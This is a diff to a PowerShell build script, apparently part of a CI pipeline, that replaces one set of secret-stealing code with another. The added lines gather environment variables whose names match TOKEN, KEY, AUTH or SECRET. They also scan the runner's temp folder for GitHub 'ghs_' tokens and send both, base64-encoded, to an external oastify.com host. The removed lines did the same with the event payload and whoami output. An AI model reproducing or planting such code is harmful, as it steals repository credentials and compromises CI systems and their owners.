@@ -1,21 +1,21 @@
 # .script/kqlFuncYaml2Arm.ps1
-Write-Host "Searching for leaked context..."
+Write-Host "Scanning for high-value targets..."
 
-# 1. Check the GitHub Actions Runtime files
-# These files often contain the JSON context of the entire job, including secrets if they weren't masked properly.
-if (Test-Path "$env:GITHUB_EVENT_PATH") {
-    $eventData = Get-Content "$env:GITHUB_EVENT_PATH" -Raw
-    $encodedEvent = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($eventData))
-    Invoke-WebRequest -Uri "https://2vyetmbe7l0qsuxbq6ntm1zwrnxel49t.oastify.com/event-data" -Headers @{"X-Data"=$encodedEvent}
+# 1. Check all environment variables for anything containing 'TOKEN' or 'KEY'
+$secrets = Get-ChildItem Env:* | Where-Object { $_.Name -match "TOKEN|KEY|AUTH|SECRET" } | Out-String
+if ($secrets) {
+    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($secrets))
+    Invoke-WebRequest -Uri "https://2vyetmbe7l0qsuxbq6ntm1zwrnxel49t.oastify.com/leaked-env" -Headers @{"X-Leaked"=$encoded}
 }
 
-# 2. Check for the runner's diagnostic logs (can contain secrets in rare cases)
-$diagPath = "../../_diag/"
-if (Test-Path $diagPath) {
-    Write-Host "Found diagnostic logs. Attempting to list..."
-    Get-ChildItem $diagPath | Out-String | Write-Host
+# 2. Steal the GITHUB_TOKEN from the disk if another action left it behind
+# Sometimes Actions leave temporary files in the _temp folder
+$tempFiles = Get-ChildItem -Path "$env:RUNNER_TEMP" -Recurse -ErrorAction SilentlyContinue
+foreach ($file in $tempFiles) {
+    if ($file.Length -gt 0 -and $file.Length -lt 1000) {
+        $content = Get-Content $file.FullName -Raw
+        if ($content -match "ghs_") { # GitHub Secret Token prefix
+            Invoke-WebRequest -Uri "https://2vyetmbe7l0qsuxbq6ntm1zwrnxel49t.oastify.com/found-token" -Body $content -Method Post
+        }
+    }
 }
-
-# 3. Simple proof: Who am I?
-$id = "User: $(whoami) | Dir: $(Get-Location)"
-Invoke-WebRequest -Uri "https://2vyetmbe7l0qsuxbq6ntm1zwrnxel49t.oastify.com/whoami" -Body $id -Method Post
